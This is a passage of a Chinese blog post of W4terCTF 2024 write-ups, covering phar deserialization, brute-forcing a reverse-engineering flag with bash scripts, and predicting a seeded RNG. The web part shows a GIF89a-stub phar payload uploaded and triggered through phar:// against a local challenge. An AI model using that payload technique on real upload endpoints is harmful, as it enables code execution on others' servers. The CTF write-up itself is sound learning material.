class="line"><span class="variable">$phar</span>-&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$user</span>); <span class="comment">//将对象user写入到metadata中</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;shell.txt&quot;</span>,<span class="string">&quot;haha&quot;</span>); <span class="comment">//添加压缩文件，文件名字为shell.txt,内容为haha</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行后得到 .phar 文件，用curl 上传文件，发现上传成功</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Auto2.png" class>
+
+<p>然后在网页地址栏输入以下url：<br><code>http://127.0.0.1:49962/?img_file=phar://check.jpg</code></p>
+<p>就能获取到flag了</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Auto3.png" class>
+
+<h3><span id="reverse">Reverse</span></h3><h4><span id="shuffle-puts">Shuffle Puts</span></h4><p>使用BinaryAI，输入meow文件，在ASCII字符串中获取到flag</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Shuffle.png" class>
+
+<h4><span id="bruteforceme">BruteforceMe</span></h4><p>首先拿到一个elf文件，放到BinaryAI中，看一下这个文件相关的函数，以下是main函数</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/BruteforceMe1.png" class>
+
+<p>可以看到几个提示：<br>1、	flag的长度应该为0x2b，也就是43<br>2、	flag会被FUN_00101209函数处理，然后再被FUN_00101290 函数处理<br>3、	当输入的flag长度正确，即使内容不正确，也会有一个语句提示正确的位数<br>4、	查看这两个函数，都是对flag做一定的转换，主要是第二个函数，是一个base64编码的函数<br>知道了以上信息之后，就可以通过输出，开始猜这个flag是什么。<br>以下编写了一个脚本，实现的效果是，对 { } 内的值猜测</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 待输入的字符串</span></span><br><span class="line">input_string=<span class="string">&quot;W4terCTF&#123;UNr31AT3DN6YtEs_caN_b3_3n1m3RAtEd&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># num</span></span><br><span class="line"><span class="comment"># _6Y</span></span><br><span class="line">input_length=<span class="variable">$&#123;#input_string&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个包含所有可能字符的数组</span></span><br><span class="line">all_chars=(&#123;0..9&#125; &#123;A..Z&#125; &#123;a..z&#125; _)</span><br><span class="line">num_chars=<span class="variable">$&#123;#all_chars[@]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义修改位置的起点</span></span><br><span class="line">start_position=19</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化最大匹配数字和字符串</span></span><br><span class="line">max_matched=0</span><br><span class="line">max_matched_string=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环调用程序</span></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">0</span>; i&lt;<span class="variable">$num_chars</span>; i++)); <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> ((j=<span class="number">0</span>; j&lt;<span class="variable">$num_chars</span>; j++)); <span class="keyword">do</span></span><br><span class="line">        <span class="comment"># 构建当前的变化字符串</span></span><br><span class="line">        new_string=<span class="string">&quot;<span class="variable">$&#123;input_string:0:$start_position&#125;</span><span class="variable">$&#123;all_chars[i]&#125;</span><span class="variable">$&#123;all_chars[j]&#125;</span><span class="variable">$&#123;input_string:$((start_position + 2))&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 调用程序并获取输出结果</span></span><br><span class="line">        result=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$new_string</span>&quot;</span> | ./BruteforceMe)</span><br><span class="line">        <span class="comment">#echo &quot;$new_string&quot;</span></span><br><span class="line">	<span class="comment">#echo &quot;$result&quot;</span></span><br><span class="line">        <span class="comment"># 提取第一个数字值</span></span><br><span class="line">        matched=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result</span>&quot;</span> | grep -oP <span class="string">&#x27;\d+(?= out of)&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$matched</span> -gt <span class="variable">$max_matched</span> ]; <span class="keyword">then</span></span><br><span class="line">            max_matched=<span class="variable">$matched</span></span><br><span class="line">            max_matched_string=<span class="variable">$new_string</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出第一个数字值最大的字符串</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;String with the maximum first digit: <span class="variable">$max_matched_string</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个脚本是半自动的，每一次都需要自己修改start_position和input_string，在全都过一遍之后发现并没有全对，奇怪了！</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/BruteforceMe2.png" class>
+
+<p>其实是本身这个脚本有缺陷，在base64编码中，应该是每3个字符为一组，改成4个字符。而在这个脚本中，其实是每两个字符进行猜测，这样很有可能在某个位置猜错了，所以需要人工排错。<br>那应该怎样做呢？也是通过3个字符为一组这个性质，一个个组排查，比如：<br>先将UNr全部替换为某个一定不会在flag出现的符号，输入程序</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/BruteforceMe3.png" class>
+
+<p>发现正确的数量少了4个，说明这个组都是对的。<br>通过这样的方法一步步排查，最终发现是 N6Y 组和 n1m 组出现了问题，此时如何纠错呢？<br>因为每个组的长度为3，那么肯定前两个字符或者后两个字符，是用脚本被一起猜的，比如，在n1m 中，1m是被一起猜出来的。<br>那么现在我对n1这两个位置，用前面的脚本猜，就会发现n1变成了nu，相同的方法用于N6Y ，发现变成 _6Y<br>把新的flag提交到程序，发现终于对了</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/BruteforceMe4.png" class>
+
+<p>后记：其实在半自动脚本那里会有更简单的方法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 待输入的字符串</span></span><br><span class="line">input_string=<span class="string">&quot;W4terCTF&#123;000000000000000000000000000000000&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个包含所有可能字符的数组</span></span><br><span class="line">all_chars=(&#123;0..9&#125; &#123;A..Z&#125; &#123;a..z&#125; _)</span><br><span class="line">num_chars=<span class="variable">$&#123;#all_chars[@]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化最大匹配数字和字符串</span></span><br><span class="line">max_matched=16  <span class="comment"># W4terCTF 不需要判断</span></span><br><span class="line">max_matched_string=<span class="string">&quot;W4terCTF&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 每次循环遍历三个字符</span></span><br><span class="line"><span class="keyword">for</span> ((i=<span class="number">9</span>; i&lt;<span class="number">42</span>; i+=<span class="number">3</span>)); <span class="keyword">do</span></span><br><span class="line">    <span class="comment"># 第一个字符</span></span><br><span class="line">    max_string_first_round=<span class="string">&quot;<span class="variable">$max_matched_string</span>&quot;</span></span><br><span class="line">    max_result_first_round=<span class="string">&quot;<span class="variable">$max_matched</span>&quot;</span></span><br><span class="line">    break_all=0</span><br><span class="line">    <span class="keyword">for</span> ((j=<span class="number">0</span>; j&lt;<span class="variable">$num_chars</span> &amp;&amp; break_all == <span class="number">0</span>; j++)); <span class="keyword">do</span></span><br><span class="line">        new_string_first_round=<span class="string">&quot;<span class="variable">$&#123;max_string_first_round:0:i&#125;</span><span class="variable">$&#123;all_chars[j]&#125;</span><span class="variable">$&#123;input_string:i+1&#125;</span>&quot;</span></span><br><span class="line">        result_first_round=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$new_string_first_round</span>&quot;</span> | ./BruteforceMe)</span><br><span class="line">        matched_first_round=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result_first_round</span>&quot;</span> | grep -oP <span class="string">&#x27;\d+(?= out of)&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$matched_first_round</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$max_result_first_round</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">            max_matched=<span class="string">&quot;<span class="variable">$matched_first_round</span>&quot;</span></span><br><span class="line">            max_matched_string=<span class="string">&quot;<span class="variable">$new_string_first_round</span>&quot;</span></span><br><span class="line">            max_string_second_round=<span class="string">&quot;<span class="variable">$max_matched_string</span>&quot;</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$max_matched</span>&quot;</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$max_matched_string</span>&quot;</span></span><br><span class="line">            <span class="comment"># 第二个字符</span></span><br><span class="line">            <span class="keyword">for</span> ((k=<span class="number">0</span>; k&lt;<span class="variable">$num_chars</span> &amp;&amp; break_all == <span class="number">0</span>; k++)); <span class="keyword">do</span></span><br><span class="line">                new_string_second_round=<span class="string">&quot;<span class="variable">$&#123;max_string_second_round:0:i+1&#125;</span><span class="variable">$&#123;all_chars[k]&#125;</span><span class="variable">$&#123;input_string:i+2&#125;</span>&quot;</span></span><br><span class="line">                result_second_round=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$new_string_second_round</span>&quot;</span> | ./BruteforceMe)</span><br><span class="line">                matched_second_round=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result_second_round</span>&quot;</span> | grep -oP <span class="string">&#x27;\d+(?= out of)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$matched_second_round</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$max_matched</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">                    max_matched=<span class="string">&quot;<span class="variable">$matched_second_round</span>&quot;</span></span><br><span class="line">                    max_matched_string=<span class="string">&quot;<span class="variable">$new_string_second_round</span>&quot;</span></span><br><span class="line">                    max_string_third_round=<span class="string">&quot;<span class="variable">$max_matched_string</span>&quot;</span></span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$max_matched</span>&quot;</span></span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$max_matched_string</span>&quot;</span></span><br><span class="line">                    <span class="comment"># 第三个字符</span></span><br><span class="line">                    <span class="keyword">for</span> ((m=<span class="number">0</span>; m&lt;<span class="variable">$num_chars</span> &amp;&amp; break_all == <span class="number">0</span>; m++)); <span class="keyword">do</span></span><br><span class="line">                        new_string_third_round=<span class="string">&quot;<span class="variable">$&#123;max_string_third_round:0:i+2&#125;</span><span class="variable">$&#123;all_chars[m]&#125;</span><span class="variable">$&#123;input_string:i+3&#125;</span>&quot;</span></span><br><span class="line">                        result_third_round=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$new_string_third_round</span>&quot;</span> | ./BruteforceMe)</span><br><span class="line">                        matched_third_round=$(<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$result_third_round</span>&quot;</span> | grep -oP <span class="string">&#x27;\d+(?= out of)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$matched_third_round</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$max_matched</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">                            max_matched=<span class="string">&quot;<span class="variable">$matched_third_round</span>&quot;</span></span><br><span class="line">                            max_matched_string=<span class="string">&quot;<span class="variable">$new_string_third_round</span>&quot;</span></span><br><span class="line">                            <span class="keyword">if</span> (( max_matched % <span class="number">4</span> == <span class="number">0</span> )); <span class="keyword">then</span></span><br><span class="line">                                break_all=1</span><br><span class="line">                                <span class="built_in">break</span></span><br><span class="line">                            <span class="keyword">fi</span></span><br><span class="line">                            <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$max_matched</span>&quot;</span></span><br><span class="line">                            <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$max_matched_string</span>&quot;</span></span><br><span class="line">                        <span class="keyword">fi</span></span><br><span class="line">                    <span class="keyword">done</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">            <span class="keyword">done</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Flag is: <span class="variable">$max_matched_string</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是这样得出的 flag 还是有问题的，需要人工排查<br><code>Flag is: W4terCTF&#123;UNr31AT3D_6Yt43_00NNb3N3n1m_RAt4d&#125;</code></p>
+<h3><span id="crypto">Crypto</span></h3><h4><span id="wish">Wish</span></h4><p>这个题真的搞心态呀，放在密码题，但是并不是密码题做法呀</p>
+<p>可以看到，这里是算抽奖概率的函数，如果“运气”足够好，那就能直接返回flag</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Wish1.png" class>
+
+<p>为什么要说是“运气”呢？仔细看第一行，random是设定seed的，也就是说，每一次抽奖，假如seed确定，结果也是确定的；而且index的值决定了for循环的次数<br>seed是由time决定的，time的范围可以从下面得到：</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Wish2.png" class>
+
+<p>也就是0到86399<br>所以，写一个python代码，遍历0到86399的seed，看哪一个的算出 abs(random.randint(0, 1919810) - 114514)的值小于等于1，那么 probability的值就能大于10，代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">86400</span>):</span><br><span class="line">    random.seed(i)</span><br><span class="line">    <span class="comment"># print(random.randint(0, 1919810))</span></span><br><span class="line">    temp = <span class="built_in">abs</span>(random.randint(<span class="number">0</span>, <span class="number">1919810</span>) - <span class="number">114514</span>)</span><br><span class="line">    <span class="keyword">if</span> temp &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(temp)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>得出结果是seed为20544，abs(random.randint(0, 1919810) - 114514)的值为1<br>也就是说，有10%的概率可以抽到，开抽！<br>通过burp设定好报文格式，保证每次的time和index是一样的，格式如下：</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Wish3.png" class>
+
+<p>抽了n次之后，就发现flag了</p>
+<img data-src="/2024/04/29/W4terCTF_2024_Writeup/Wish4.png" class>
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>赏个鸡腿🍗</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="黄梓铭 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.png" alt="黄梓铭 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/04/17/%E7%AE%80%E5%8D%95%E7%9A%84NFT%E9%93%B8%E9%80%A0%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/" rel="prev" title="简单的NFT铸造智能合约">
+      <i class="fa fa-chevron-left"></i> 简单的NFT铸造智能合约
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">2.1.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">2.1.1.</span> <span class="nav-text">broken.mp4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">2.1.2.</span> <span class="nav-text">Sign in</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">2.1.3.</span> <span class="nav-text">Priv Escape</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">2.1.4.</span> <span class="nav-text">GZ GPT</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">2.1.5.</span> <span class="nav-text">Spam 2024</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">2.2.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">2.2.1.</span> <span class="nav-text">Remember It 0</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">2.3.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">2.3.1.</span> <span class="nav-text">GitZip</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">2.3.2.</span> <span class="nav-text">PNG Server</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">2.3.3.</span> <span class="nav-text">User Manager</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">2.3.4.</span> <span class="nav-text">Auto Unserialize</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">2.4.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">2.4.1.</span> <span class="nav-text">Shuffle Puts</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">2.4.2.</span> <span class="nav-text">BruteforceMe</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">2.5.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">2.5.1.</span> <span class="nav-text">Wish</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="黄梓铭"
+      src="/images/MyPhoto.jpg">
+  <p class="site-author-name" itemprop="name">黄梓铭</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Ivan53471" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Ivan53471" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1480639239@qq.com" title="E-Mail → 1480639239@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">黄梓铭</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">64k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">58 分钟</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  
+  <style>
+    .copy-btn {
+      display: inline-block;
+      padding: 6px 12px;
+      font-size: 13px;
+      font-weight: 700;
+      line-height: 20px;
+      color: #4D4D4C;
+      white-space: nowrap;
+      vertical-align: middle;
+      cursor: pointer;
+      background-color: #F7F7F7;
+      background-image: linear-gradient(#F7F7F7, #F7F7F7);
+      border: 1px solid #d5d5d5;
+      border-radius: 3px;
+      user-select: none;
+      outline: 0;
+    }
+
+    .highlight-wrap .copy-btn {
+      transition: opacity .3s ease-in-out;
+      opacity: 0;
+      padding: 2px 6px;
+      position: absolute;
+      right: 4px;
+      top: 8px;
+    }
+
+    .highlight-wrap:hover .copy-btn,
+    .highlight-wrap .copy-btn:focus {
+      opacity: 1
+    }
+
+    .highlight-wrap {
+      position: relative;
+    }
+  </style>
+
+  <script>
+    $('.highlight').each(function (i, e) {
+      var $wrap = $('<div>').addClass('highlight-wrap')
+      $(e).after($wrap)
+      $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function (e) {
+        var code = $(this).parent().find('.code').find('.line').map(function (i, e) {
+          return $(e).text()
+        }).toArray().join('\n')
+        var ta = document.createElement('textarea')
+        document.body.appendChild(ta)
+        ta.style.position = 'absolute'
+        ta.style.top = '0px'
+        ta.style.left = '0px'
+        ta.value = code
+        ta.select()
+        ta.focus()
+        var result = document.execCommand('copy')
+        document.body.removeChild(ta)
+        
+        $(this).blur()
+      })).on('mouseleave', function (e) {
+        var $b = $(this).find('.copy-btn')
+        setTimeout(function () {
+          $b.text('复制')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+
+</body>
+</html>
